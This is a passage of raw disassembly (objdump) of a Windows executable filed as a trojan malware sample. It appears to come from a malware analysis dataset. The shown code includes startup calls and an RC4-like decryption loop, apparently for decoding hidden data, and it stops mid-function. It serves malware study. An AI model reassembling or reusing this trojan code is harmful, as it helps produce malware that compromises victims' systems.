
malware_samples/trojan/0bc7e12348ca36df7d5e457cdec234b539e1d791a96baebf147e5be568949074.exe:     file format pei-i386


Disassembly of section .code:

00401000 <.code>:
  401000:	68 a8 00 00 00       	push   $0xa8
  401005:	68 00 00 00 00       	push   $0x0
  40100a:	68 ec 6f 41 00       	push   $0x416fec
  40100f:	e8 5c 40 00 00       	call   0x405070
  401014:	83 c4 0c             	add    $0xc,%esp
  401017:	68 00 00 00 00       	push   $0x0
  40101c:	e8 55 40 00 00       	call   0x405076
  401021:	a3 f0 6f 41 00       	mov    %eax,0x416ff0
  401026:	68 00 00 00 00       	push   $0x0
  40102b:	68 00 10 00 00       	push   $0x1000
  401030:	68 00 00 00 00       	push   $0x0
  401035:	e8 42 40 00 00       	call   0x40507c
  40103a:	a3 ec 6f 41 00       	mov    %eax,0x416fec
  40103f:	e8 bc 3f 00 00       	call   0x405000
  401044:	b8 80 60 41 00       	mov    $0x416080,%eax
  401049:	a3 0c 70 41 00       	mov    %eax,0x41700c
  40104e:	e8 1d ca 00 00       	call   0x40da70
  401053:	e8 89 c7 00 00       	call   0x40d7e1
  401058:	e8 83 96 00 00       	call   0x40a6e0
  40105d:	e8 07 8f 00 00       	call   0x409f69
  401062:	e8 9a 89 00 00       	call   0x409a01
  401067:	e8 14 87 00 00       	call   0x409780
  40106c:	e8 38 82 00 00       	call   0x4092a9
  401071:	e8 b8 79 00 00       	call   0x408a2e
  401076:	e8 3a 43 00 00       	call   0x4053b5
  40107b:	e8 03 b3 00 00       	call   0x40c383
  401080:	e8 ab 9d 00 00       	call   0x40ae30
  401085:	ba 2a 60 41 00       	mov    $0x41602a,%edx
  40108a:	8d 0d f8 6f 41 00    	lea    0x416ff8,%ecx
  401090:	e8 d3 3f 00 00       	call   0x405068
  401095:	68 f5 ff ff ff       	push   $0xfffffff5
  40109a:	e8 e3 3f 00 00       	call   0x405082
  40109f:	a3 14 70 41 00       	mov    %eax,0x417014
  4010a4:	b8 00 02 00 00       	mov    $0x200,%eax
  4010a9:	50                   	push   %eax
  4010aa:	8d 05 90 70 41 00    	lea    0x417090,%eax
  4010b0:	50                   	push   %eax
  4010b1:	31 c0                	xor    %eax,%eax
  4010b3:	50                   	push   %eax
  4010b4:	68 15 00 00 00       	push   $0x15
  4010b9:	68 04 00 00 00       	push   $0x4
  4010be:	e8 5d 89 00 00       	call   0x409a20
  4010c3:	ff 35 78 70 41 00    	push   0x417078
  4010c9:	e8 4c 8f 00 00       	call   0x40a01a
  4010ce:	68 07 00 00 00       	push   $0x7
  4010d3:	68 70 60 41 00       	push   $0x416070
  4010d8:	8d 05 78 70 41 00    	lea    0x417078,%eax
  4010de:	50                   	push   %eax
  4010df:	68 08 00 00 00       	push   $0x8
  4010e4:	e8 9f 8e 00 00       	call   0x409f88
  4010e9:	ff 35 80 70 41 00    	push   0x417080
  4010ef:	e8 26 8f 00 00       	call   0x40a01a
  4010f4:	68 08 00 00 00       	push   $0x8
  4010f9:	68 68 60 41 00       	push   $0x416068
  4010fe:	8d 05 80 70 41 00    	lea    0x417080,%eax
  401104:	50                   	push   %eax
  401105:	68 04 00 00 00       	push   $0x4
  40110a:	e8 79 8e 00 00       	call   0x409f88
  40110f:	68 70 70 41 00       	push   $0x417070
  401114:	68 78 60 41 00       	push   $0x416078
  401119:	68 07 00 00 00       	push   $0x7
  40111e:	68 a1 86 01 00       	push   $0x186a1
  401123:	68 0c 00 00 00       	push   $0xc
  401128:	e8 dd c6 00 00       	call   0x40d80a
  40112d:	ba 36 60 41 00       	mov    $0x416036,%edx
  401132:	8d 0d 3c 70 41 00    	lea    0x41703c,%ecx
  401138:	e8 2b 3f 00 00       	call   0x405068
  40113d:	ff 35 88 70 41 00    	push   0x417088
  401143:	e8 d2 8e 00 00       	call   0x40a01a
  401148:	68 08 00 00 00       	push   $0x8
  40114d:	68 68 60 41 00       	push   $0x416068
  401152:	8d 05 88 70 41 00    	lea    0x417088,%eax
  401158:	50                   	push   %eax
  401159:	68 04 00 00 00       	push   $0x4
  40115e:	e8 25 8e 00 00       	call   0x409f88
  401163:	8d 05 88 1c 40 00    	lea    0x401c88,%eax
  401169:	50                   	push   %eax
  40116a:	e8 01 84 00 00       	call   0x409570
  40116f:	52                   	push   %edx
  401170:	e8 4b c9 00 00       	call   0x40dac0
  401175:	5a                   	pop    %edx
  401176:	50                   	push   %eax
  401177:	e8 c4 21 00 00       	call   0x403340
  40117c:	68 1c 70 41 00       	push   $0x41701c
  401181:	e8 7a c9 00 00       	call   0x40db00
  401186:	e8 d0 07 00 00       	call   0x40195b
  40118b:	8b 1d 2c 70 41 00    	mov    0x41702c,%ebx
  401191:	83 fb 01             	cmp    $0x1,%ebx
  401194:	75 05                	jne    0x40119b
  401196:	e8 d0 1a 00 00       	call   0x402c6b
  40119b:	e8 d9 28 00 00       	call   0x403a79
  4011a0:	68 00 00 00 00       	push   $0x0
  4011a5:	e8 15 00 00 00       	call   0x4011bf
  4011aa:	e8 f1 c8 00 00       	call   0x40daa0
  4011af:	ff 35 ec 6f 41 00    	push   0x416fec
  4011b5:	e8 ce 3e 00 00       	call   0x405088
  4011ba:	e8 cf 3e 00 00       	call   0x40508e
  4011bf:	e8 af 41 00 00       	call   0x405373
  4011c4:	e8 c7 83 00 00       	call   0x409590
  4011c9:	e8 27 91 00 00       	call   0x40a2f5
  4011ce:	e8 fd 94 00 00       	call   0x40a6d0
  4011d3:	e8 2c bd 00 00       	call   0x40cf04
  4011d8:	e8 93 85 00 00       	call   0x409770
  4011dd:	c3                   	ret
  4011de:	55                   	push   %ebp
  4011df:	53                   	push   %ebx
  4011e0:	57                   	push   %edi
  4011e1:	ba 10 00 00 00       	mov    $0x10,%edx
  4011e6:	83 ec 04             	sub    $0x4,%esp
  4011e9:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4011f0:	4a                   	dec    %edx
  4011f1:	75 f3                	jne    0x4011e6
  4011f3:	8b 54 24 58          	mov    0x58(%esp),%edx
  4011f7:	8d 0c 24             	lea    (%esp),%ecx
  4011fa:	e8 61 3e 00 00       	call   0x405060
  4011ff:	ff 34 24             	push   (%esp)
  401202:	e8 f9 44 00 00       	call   0x405700
  401207:	89 44 24 04          	mov    %eax,0x4(%esp)
  40120b:	ff 74 24 04          	push   0x4(%esp)
  40120f:	e8 8c 85 00 00       	call   0x4097a0
  401214:	89 44 24 08          	mov    %eax,0x8(%esp)
  401218:	8d 54 24 0c          	lea    0xc(%esp),%edx
  40121c:	52                   	push   %edx
  40121d:	68 00 00 00 00       	push   $0x0
  401222:	68 05 00 00 00       	push   $0x5
  401227:	68 00 01 00 00       	push   $0x100
  40122c:	68 04 00 00 00       	push   $0x4
  401231:	e8 d4 c5 00 00       	call   0x40d80a
  401236:	8d 54 24 14          	lea    0x14(%esp),%edx
  40123a:	52                   	push   %edx
  40123b:	68 00 00 00 00       	push   $0x0
  401240:	68 05 00 00 00       	push   $0x5
  401245:	68 00 01 00 00       	push   $0x100
  40124a:	68 04 00 00 00       	push   $0x4
  40124f:	e8 b6 c5 00 00       	call   0x40d80a
  401254:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  40125b:	00 
  40125c:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%esp)
  401263:	00 
  401264:	c7 44 24 24 00 00 00 	movl   $0x0,0x24(%esp)
  40126b:	00 
  40126c:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%esp)
  401273:	00 
  401274:	c7 44 24 2c 00 00 00 	movl   $0x0,0x2c(%esp)
  40127b:	00 
  40127c:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%esp)
  401283:	00 
  401284:	c7 44 24 20 01 00 00 	movl   $0x1,0x20(%esp)
  40128b:	00 
  40128c:	c7 44 24 08 20 00 00 	movl   $0x20,0x8(%esp)
  401293:	00 
  401294:	ff 74 24 0c          	push   0xc(%esp)
  401298:	58                   	pop    %eax
  401299:	89 44 24 34          	mov    %eax,0x34(%esp)
  40129d:	ff 74 24 04          	push   0x4(%esp)
  4012a1:	58                   	pop    %eax
  4012a2:	89 44 24 38          	mov    %eax,0x38(%esp)
  4012a6:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  4012ad:	00 
  4012ae:	eb 00                	jmp    0x4012b0
  4012b0:	b8 ff 00 00 00       	mov    $0xff,%eax
  4012b5:	3b 44 24 1c          	cmp    0x1c(%esp),%eax
  4012b9:	7c 54                	jl     0x40130f
  4012bb:	ff 74 24 1c          	push   0x1c(%esp)
  4012bf:	8b 6c 24 38          	mov    0x38(%esp),%ebp
  4012c3:	58                   	pop    %eax
  4012c4:	89 45 00             	mov    %eax,0x0(%ebp)
  4012c7:	8b 5c 24 34          	mov    0x34(%esp),%ebx
  4012cb:	83 c3 04             	add    $0x4,%ebx
  4012ce:	89 5c 24 34          	mov    %ebx,0x34(%esp)
  4012d2:	8b 6c 24 38          	mov    0x38(%esp),%ebp
  4012d6:	0f be 5d 00          	movsbl 0x0(%ebp),%ebx
  4012da:	21 db                	and    %ebx,%ebx
  4012dc:	75 09                	jne    0x4012e7
  4012de:	ff 74 24 04          	push   0x4(%esp)
  4012e2:	58                   	pop    %eax
  4012e3:	89 44 24 38          	mov    %eax,0x38(%esp)
  4012e7:	8b 6c 24 38          	mov    0x38(%esp),%ebp
  4012eb:	0f be 45 00          	movsbl 0x0(%ebp),%eax
  4012ef:	50                   	push   %eax
  4012f0:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  4012f4:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  4012f8:	c1 e3 02             	shl    $0x2,%ebx
  4012fb:	58                   	pop    %eax
  4012fc:	89 44 1d 00          	mov    %eax,0x0(%ebp,%ebx,1)
  401300:	8b 5c 24 38          	mov    0x38(%esp),%ebx
  401304:	43                   	inc    %ebx
  401305:	89 5c 24 38          	mov    %ebx,0x38(%esp)
  401309:	ff 44 24 1c          	incl   0x1c(%esp)
  40130d:	71 a1                	jno    0x4012b0
  40130f:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%esp)
  401316:	00 
  401317:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  40131e:	00 
  40131f:	eb 00                	jmp    0x401321
  401321:	b8 ff 00 00 00       	mov    $0xff,%eax
  401326:	3b 44 24 1c          	cmp    0x1c(%esp),%eax
  40132a:	7c 6d                	jl     0x401399
  40132c:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  401330:	8b 7c 24 1c          	mov    0x1c(%esp),%edi
  401334:	8b 6c 24 0c          	mov    0xc(%esp),%ebp
  401338:	c1 e7 02             	shl    $0x2,%edi
  40133b:	03 5c 3d 00          	add    0x0(%ebp,%edi,1),%ebx
  40133f:	8b 7c 24 1c          	mov    0x1c(%esp),%edi
  401343:	8b 6c 24 14          	mov    0x14(%esp),%ebp
  401347:	c1 e7 02             	shl    $0x2,%edi
  40134a:	03 5c 3d 00          	add    0x0(%ebp,%edi,1),%ebx
  40134e:	81 e3 ff 00 00 00    	and    $0xff,%ebx
  401354:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  401358:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  40135c:	8b 6c 24 0c          	mov    0xc(%esp),%ebp
  401360:	c1 e3 02             	shl    $0x2,%ebx
  401363:	ff 74 1d 00          	push   0x0(%ebp,%ebx,1)
  401367:	58                   	pop    %eax
  401368:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  40136c:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  401370:	c1 e3 02             	shl    $0x2,%ebx
  401373:	ff 74 1d 00          	push   0x0(%ebp,%ebx,1)
  401377:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  40137b:	c1 e3 02             	shl    $0x2,%ebx
  40137e:	58                   	pop    %eax
  40137f:	89 44 1d 00          	mov    %eax,0x0(%ebp,%ebx,1)
  401383:	ff 74 24 2c          	push   0x2c(%esp)
  401387:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  40138b:	c1 e3 02             	shl    $0x2,%ebx
  40138e:	58                   	pop    %eax
  40138f:	89 44 1d 00          	mov    %eax,0x0(%ebp,%ebx,1)
  401393:	ff 44 24 1c          	incl   0x1c(%esp)
  401397:	71 88                	jno    0x401321
  401399:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  4013a0:	00 
  4013a1:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%esp)
  4013a8:	00 
  4013a9:	ff 74 24 50          	push   0x50(%esp)
  4013ad:	58                   	pop    %eax
  4013ae:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  4013b2:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%esp)
  4013b9:	00 
  4013ba:	eb 00                	jmp    0x4013bc
  4013bc:	8b 5c 24 54          	mov    0x54(%esp),%ebx
  4013c0:	4b                   	dec    %ebx
  4013c1:	3b 5c 24 28          	cmp    0x28(%esp),%ebx
  4013c5:	0f 8c c3 00 00 00    	jl     0x40148e
  4013cb:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  4013cf:	43                   	inc    %ebx
  4013d0:	81 e3 ff 00 00 00    	and    $0xff,%ebx
  4013d6:	89 5c 24 1c          	mov    %ebx,0x1c(%esp)
  4013da:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  4013de:	8b 7c 24 1c          	mov    0x1c(%esp),%edi
  4013e2:	8b 6c 24 0c          	mov    0xc(%esp),%ebp
  4013e6:	c1 e7 02             	shl    $0x2,%edi
  4013e9:	03 5c 3d 00          	add    0x0(%ebp,%edi,1),%ebx
  4013ed:	81 e3 ff 00 00 00    	and    $0xff,%ebx
  4013f3:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  4013f7:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  4013fb:	c1 e3 02             	shl    $0x2,%ebx
  4013fe:	ff 74 1d 00          	push   0x0(%ebp,%ebx,1)
  401402:	58                   	pop    %eax
  401403:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  401407:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  40140b:	c1 e3 02             	shl    $0x2,%ebx
  40140e:	ff 74 1d 00          	push   0x0(%ebp,%ebx,1)
  401412:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  401416:	c1 e3 02             	shl    $0x2,%ebx
  401419:	58                   	pop    %eax
  40141a:	89 44 1d 00          	mov    %eax,0x0(%ebp,%ebx,1)
  40141e:	ff 74 24 2c          	push   0x2c(%esp)
  401422:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  401426:	c1 e3 02             	shl    $0x2,%ebx
  401429:	58                   	pop    %eax
  40142a:	89 44 1d 00          	mov    %eax,0x0(%ebp,%ebx,1)
  40142e:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  401432:	c1 e3 02             	shl    $0x2,%ebx
  401435:	8b 5c 1d 00          	mov    0x0(%ebp,%ebx,1),%ebx
  401439:	8b 7c 24 20          	mov    0x20(%esp),%edi
  40143d:	c1 e7 02             	shl    $0x2,%edi
  401440:	8b 7c 3d 00          	mov    0x0(%ebp,%edi,1),%edi
  401444:	81 e7 ff 00 00 00    	and    $0xff,%edi
  40144a:	01 fb                	add    %edi,%ebx
  40144c:	81 e3 ff 00 00 00    	and    $0xff,%ebx
  401452:	89 5c 24 24          	mov    %ebx,0x24(%esp)
  401456:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  40145a:	c1 e3 02             	shl    $0x2,%ebx
  40145d:	ff 74 1d 00          	push   0x0(%ebp,%ebx,1)
  401461:	58                   	pop    %eax
  401462:	89 44 24 30          	mov    %eax,0x30(%esp)
  401466:	8b 6c 24 3c          	mov    0x3c(%esp),%ebp
  40146a:	0f be 5d 00          	movsbl 0x0(%ebp),%ebx
  40146e:	33 5c 24 30          	xor    0x30(%esp),%ebx
  401472:	53                   	push   %ebx
  401473:	8b 6c 24 40          	mov    0x40(%esp),%ebp
  401477:	58                   	pop    %eax
  401478:	88 45 00             	mov    %al,0x0(%ebp)
  40147b:	8b 5c 24 3c          	mov    0x3c(%esp),%ebx
  40147f:	43                   	inc    %ebx
  401480:	89 5c 24 3c          	mov    %ebx,0x3c(%esp)
  401484:	ff 44 24 28          	incl   0x28(%esp)
  401488:	0f 81 2e ff ff ff    	jno    0x4013bc
  40148e:	8d 54 24 0c          	lea    0xc(%esp),%edx
  401492:	52                   	push   %edx
  401493:	68 00 00 00 00       	push   $0x0
  401498:	68 05 00 00 00       	push   $0x5
  40149d:	68 01 00 00 00       	push   $0x1
  4014a2:	68 04 00 00 00       	push   $0x4
  4014a7:	e8 5e c3 00 00       	call   0x40d80a
  4014ac:	8d 54 24 14          	lea    0x14(%esp),%edx
  4014b0:	52                   	push   %edx
  4014b1:	68 00 00 00 00       	push   $0x0
  4014b6:	68 05 00 00 00       	push   $0x5
  4014bb:	68 01 00 00 00       	push   $0x1
  4014c0:	68 04 00 00 00       	push   $0x4
  4014c5:	e8 40 c3 00 00       	call   0x40d80a
  4014ca:	ff 74 24 04          	push   0x4(%esp)
  4014ce:	e8 ed 82 00 00       	call   0x4097c0
  4014d3:	8b 44 24 50          	mov    0x50(%esp),%eax
  4014d7:	eb 02                	jmp    0x4014db
  4014d9:	31 c0                	xor    %eax,%eax
  4014db:	ff 34 24             	push   (%esp)
  4014de:	e8 ad c6 00 00       	call   0x40db90
  4014e3:	50                   	push   %eax
  4014e4:	ff 74 24 10          	push   0x10(%esp)
  4014e8:	e8 70 c4 00 00       	call   0x40d95d
  4014ed:	ff 74 24 18          	push   0x18(%esp)
  4014f1:	e8 67 c4 00 00       	call   0x40d95d
  4014f6:	58                   	pop    %eax
  4014f7:	83 c4 40             	add    $0x40,%esp
  4014fa:	5f                   	pop    %edi
  4014fb:	5b                   	pop    %ebx
  4014fc:	5d                   	pop    %ebp
  4014fd:	c2 0c 00             	ret    $0xc
  401500:	55                   	push   %ebp
  401501:	53                   	push   %ebx
  401502:	ba 0b 00 00 00       	mov    $0xb,%edx
  401507:	83 ec 04             	sub    $0x4,%esp
  40150a:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  401511:	4a                   	dec    %edx
  401512:	75 f3                	jne    0x401507
  401514:	e8 e7 c6 00 00       	call   0x40dc00
  401519:	8b 1d 6c 70 41 00    	mov    0x41706c,%ebx
  40151f:	83 fb 01             	cmp    $0x1,%ebx
  401522:	0f 85 32 01 00 00    	jne    0x40165a
  401528:	8b 1d 4c 70 41 00    	mov    0x41704c,%ebx
  40152e:	83 fb 01             	cmp    $0x1,%ebx
  401531:	75 12                	jne    0x401545
  401533:	8b 1d 38 70 41 00    	mov    0x417038,%ebx
  401539:	83 fb 01             	cmp    $0x1,%ebx
  40153c:	74 07                	je     0x401545
  40153e:	b8 01 00 00 00       	mov    $0x1,%eax
  401543:	eb 02                	jmp    0x401547
  401545:	31 c0                	xor    %eax,%eax
  401547:	21 c0                	and    %eax,%eax
  401549:	0f 84 06 01 00 00    	je     0x401655
  40154f:	b8 22 60 41 00       	mov    $0x416022,%eax
  401554:	50                   	push   %eax
  401555:	ff 35 68 70 41 00    	push   0x417068
  40155b:	e8 00 42 00 00       	call   0x405760
  401560:	89 04 24             	mov    %eax,(%esp)
  401563:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
  40156a:	00 
  40156b:	eb 00                	jmp    0x40156d
  40156d:	8b 04 24             	mov    (%esp),%eax
  401570:	3b 44 24 04          	cmp    0x4(%esp),%eax
  401574:	0f 8c 92 00 00 00    	jl     0x40160c
  40157a:	52                   	push   %edx
  40157b:	e8 40 c5 00 00       	call   0x40dac0
  401580:	5a                   	pop    %edx
  401581:	50                   	push   %eax
  401582:	52                   	push   %edx
  401583:	e8 38 c5 00 00       	call   0x40dac0
  401588:	5a                   	pop    %edx
  401589:	50                   	push   %eax
  40158a:	b8 60 60 41 00       	mov    $0x416060,%eax
  40158f:	50                   	push   %eax
  401590:	ff 74 24 10          	push   0x10(%esp)
  401594:	ff 35 68 70 41 00    	push   0x417068
  40159a:	e8 51 42 00 00       	call   0x4057f0
  40159f:	8d 44 24 0c          	lea    0xc(%esp),%eax
  4015a3:	50                   	push   %eax
  4015a4:	e8 57 c5 00 00       	call   0x40db00
  4015a9:	ff 74 24 08          	push   0x8(%esp)
  4015ad:	e8 93 0f 00 00       	call   0x402545
  4015b2:	21 c0                	and    %eax,%eax
  4015b4:	74 4c                	je     0x401602
  4015b6:	52                   	push   %edx
  4015b7:	e8 04 c5 00 00       	call   0x40dac0
  4015bc:	5a                   	pop    %edx
  4015bd:	50                   	push   %eax
  4015be:	ff 74 24 0c          	push   0xc(%esp)
  4015c2:	e8 47 19 00 00       	call   0x402f0e
  4015c7:	8d 44 24 10          	lea    0x10(%esp),%eax
  4015cb:	50                   	push   %eax
  4015cc:	e8 2f c5 00 00       	call   0x40db00
  4015d1:	8b 54 24 10          	mov    0x10(%esp),%edx
  4015d5:	52                   	push   %edx
  4015d6:	e8 e5 c4 00 00       	call   0x40dac0
  4015db:	5a                   	pop    %edx
  4015dc:	50                   	push   %eax
  4015dd:	52                   	push   %edx
  4015de:	e8 7d c6 00 00       	call   0x40dc60
  4015e3:	8b 54 24 10          	mov    0x10(%esp),%edx
  4015e7:	52                   	push   %edx
  4015e8:	e8 73 c6 00 00       	call   0x40dc60
  4015ed:	ba 60 60 41 00       	mov    $0x416060,%edx
  4015f2:	52                   	push   %edx
  4015f3:	e8 68 c6 00 00       	call   0x40dc60
  4015f8:	8d 44 24 14          	lea    0x14(%esp),%eax
  4015fc:	50                   	push   %eax
  4015fd:	e8 fe c4 00 00       	call   0x40db00
  401602:	ff 44 24 04          	incl   0x4(%esp)
  401606:	0f 81 61 ff ff ff    	jno    0x40156d
  40160c:	ff 74 24 10          	push   0x10(%esp)
  401610:	e8 eb 40 00 00       	call   0x405700
  401615:	89 44 24 14          	mov    %eax,0x14(%esp)
  401619:	68 00 00 00 00       	push   $0x0
  40161e:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  401622:	50                   	push   %eax
  401623:	ff 74 24 1c          	push   0x1c(%esp)
  401627:	e8 74 81 00 00       	call   0x4097a0
  40162c:	50                   	push   %eax
  40162d:	ff 74 24 20          	push   0x20(%esp)
  401631:	ff 35 14 70 41 00    	push   0x417014
  401637:	e8 58 3a 00 00       	call   0x405094
  40163c:	ff 74 24 14          	push   0x14(%esp)
  401640:	e8 7b 81 00 00       	call   0x4097c0
  401645:	ba 20 60 41 00       	mov    $0x416020,%edx
  40164a:	8d 0d 68 70 41 00    	lea    0x417068,%ecx
  401650:	e8 13 3a 00 00       	call   0x405068
  401655:	e9 ce 02 00 00       	jmp    0x401928
  40165a:	c7 05 6c 70 41 00 01 	movl   $0x1,0x41706c
  401661:	00 00 00 
  401664:	c7 44 24 1c 01 00 00 	movl   $0x1,0x1c(%esp)
  40166b:	00 
  40166c:	52                   	push   %edx
  40166d:	e8 4e c4 00 00       	call   0x40dac0
  401672:	5a                   	pop    %edx
  401673:	50                   	push   %eax
  401674:	52                   	push   %edx
  401675:	e8 46 c4 00 00       	call   0x40dac0
  40167a:	5a                   	pop    %edx
  40167b:	50                   	push   %eax
  40167c:	b8 2a 60 41 00       	mov    $0x41602a,%eax
  401681:	50                   	push   %eax
  401682:	ff 74 24 28          	push   0x28(%esp)
  401686:	ff 35 00 70 41 00    	push   0x417000
  40168c:	e8 5f 41 00 00       	call   0x4057f0
  401691:	8d 44 24 14          	lea    0x14(%esp),%eax
  401695:	50                   	push   %eax
  401696:	e8 65 c4 00 00       	call   0x40db00
  40169b:	b8 2e 60 41 00       	mov    $0x41602e,%eax
  4016a0:	50                   	push   %eax
  4016a1:	ff 74 24 14          	push   0x14(%esp)
  4016a5:	e8 76 42 00 00       	call   0x405920
  4016aa:	89 44 24 20          	mov    %eax,0x20(%esp)
  4016ae:	83 7c 24 20 00       	cmpl   $0x0,0x20(%esp)
  4016b3:	74 5c                	je     0x401711
  4016b5:	52                   	push   %edx
  4016b6:	e8 05 c4 00 00       	call   0x40dac0
  4016bb:	5a                   	pop    %edx
  4016bc:	50                   	push   %eax
  4016bd:	52                   	push   %edx
  4016be:	e8 fd c3 00 00       	call   0x40dac0
  4016c3:	5a                   	pop    %edx
  4016c4:	50                   	push   %eax
  4016c5:	b8 2e 60 41 00       	mov    $0x41602e,%eax
  4016ca:	50                   	push   %eax
  4016cb:	68 02 00 00 00       	push   $0x2
  4016d0:	ff 74 24 20          	push   0x20(%esp)
  4016d4:	e8 17 41 00 00       	call   0x4057f0
  4016d9:	8d 44 24 28          	lea    0x28(%esp),%eax
  4016dd:	50                   	push   %eax
  4016de:	e8 1d c4 00 00       	call   0x40db00
  4016e3:	52                   	push   %edx
  4016e4:	e8 d7 c3 00 00       	call   0x40dac0
  4016e9:	5a                   	pop    %edx
  4016ea:	50                   	push   %eax
  4016eb:	52                   	push   %edx
  4016ec:	e8 cf c3 00 00       	call   0x40dac0
  4016f1:	5a                   	pop    %edx
  4016f2:	50                   	push   %eax
  4016f3:	b8 2e 60 41 00       	mov    $0x41602e,%eax
  4016f8:	50                   	push   %eax
  4016f9:	68 01 00 00 00       	push   $0x1
  4016fe:	ff 74 24 20          	push   0x20(%esp)
  401702:	e8 e9 40 00 00       	call   0x4057f0
  401707:	8d 44 24 14          	lea    0x14(%esp),%eax
  40170b:	50                   	push   %eax
  40170c:	e8 ef c3 00 00       	call   0x40db00
  401711:	8b 54 24 10          	mov    0x10(%esp),%edx
  401715:	31 c9                	xor    %ecx,%ecx
  401717:	e8 04 3a 00 00       	call   0x405120
  40171c:	0f 85 ee 01 00 00    	jne    0x401910
  401722:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  401726:	89 d8                	mov    %ebx,%eax
  401728:	b9 02 00 00 00       	mov    $0x2,%ecx
  40172d:	99                   	cltd
  40172e:	f7 f9                	idiv   %ecx
  401730:	89 d3                	mov    %edx,%ebx
  401732:	21 db                	and    %ebx,%ebx
  401734:	75 2b                	jne    0x401761
  401736:	ff 74 24 10          	push   0x10(%esp)
  40173a:	e8 41 42 00 00       	call   0x405980
  40173f:	50                   	push   %eax
  401740:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  401744:	8b 2d 70 70 41 00    	mov    0x417070,%ebp
  40174a:	6b db 0c             	imul   $0xc,%ebx,%ebx
  40174d:	01 dd                	add    %ebx,%ebp
  40174f:	58                   	pop    %eax
  401750:	89 45 08             	mov    %eax,0x8(%ebp)
  401753:	8b 5c 24 04          	mov    0x4(%esp),%ebx
  401757:	43                   	inc    %ebx
  401758:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  40175c:	e9 ad 01 00 00       	jmp    0x40190e
  401761:	52                   	push   %edx
  401762:	e8 59 c3 00 00       	call   0x40dac0
  401767:	5a                   	pop    %edx
  401768:	50                   	push   %eax
  401769:	52                   	push   %edx
  40176a:	e8 51 c3 00 00       	call   0x40dac0
  40176f:	5a                   	pop    %edx
  401770:	50                   	push   %eax
  401771:	68 01 00 00 00       	push   $0x1
  401776:	ff 74 24 1c          	push   0x1c(%esp)
  40177a:	e8 41 43 00 00       	call   0x405ac0
  40177f:	e8 3c c5 00 00       	call   0x40dcc0
  401784:	ba 32 60 41 00       	mov    $0x416032,%edx
  401789:	59                   	pop    %ecx
  40178a:	51                   	push   %ecx
  40178b:	e8 d0 39 00 00       	call   0x405160
  401790:	89 c1                	mov    %eax,%ecx
  401792:	e8 89 39 00 00       	call   0x405120
  401797:	0f 84 b4 00 00 00    	je     0x401851
  40179d:	8b 15 24 70 41 00    	mov    0x417024,%edx
  4017a3:	52                   	push   %edx
  4017a4:	e8 17 c3 00 00       	call   0x40dac0
  4017a9:	5a                   	pop    %edx
  4017aa:	50                   	push   %eax
  4017ab:	52                   	push   %edx
  4017ac:	e8 af c4 00 00       	call   0x40dc60
  4017b1:	8b 15 3c 70 41 00    	mov    0x41703c,%edx
  4017b7:	52                   	push   %edx
  4017b8:	e8 a3 c4 00 00       	call   0x40dc60
  4017bd:	52                   	push   %edx
  4017be:	e8 fd c2 00 00       	call   0x40dac0
  4017c3:	5a                   	pop    %edx
  4017c4:	50                   	push   %eax
  4017c5:	52                   	push   %edx
  4017c6:	e8 f5 c2 00 00       	call   0x40dac0
  4017cb:	5a                   	pop    %edx
  4017cc:	50                   	push   %eax
  4017cd:	b8 32 60 41 00       	mov    $0x416032,%eax
  4017d2:	50                   	push   %eax
  4017d3:	ff 74 24 20          	push   0x20(%esp)
  4017d7:	e8 64 45 00 00       	call   0x405d40
  4017dc:	58                   	pop    %eax
  4017dd:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  4017e1:	50                   	push   %eax
  4017e2:	e8 19 c3 00 00       	call   0x40db00
  4017e7:	ff 74 24 28          	push   0x28(%esp)
  4017eb:	e8 15 8b 00 00       	call   0x40a305
  4017f0:	8b 1d 58 70 41 00    	mov    0x417058,%ebx
  4017f6:	83 fb 01             	cmp    $0x1,%ebx
  4017f9:	75 13                	jne    0x40180e
  4017fb:	ff 74 24 24          	push   0x24(%esp)
  4017ff:	e8 7c 41 00 00       	call   0x405980
  401804:	50                   	push   %eax
  401805:	ff 74 24 2c          	push   0x2c(%esp)
  401809:	e8 77 8b 00 00       	call   0x40a385
  40180e:	ff 74 24 28          	push   0x28(%esp)
  401812:	e8 c9 21 00 00       	call   0x4039e0
  401817:	8b 15 68 70 41 00    	mov    0x417068,%edx
  40181d:	52                   	push   %edx
  40181e:	e8 9d c2 00 00       	call   0x40dac0
  401823:	5a                   	pop    %edx
  401824:	50                   	push   %eax
  401825:	52                   	push   %edx
  401826:	e8 35 c4 00 00       	call   0x40dc60
  40182b:	8b 54 24 2c          	mov    0x2c(%esp),%edx
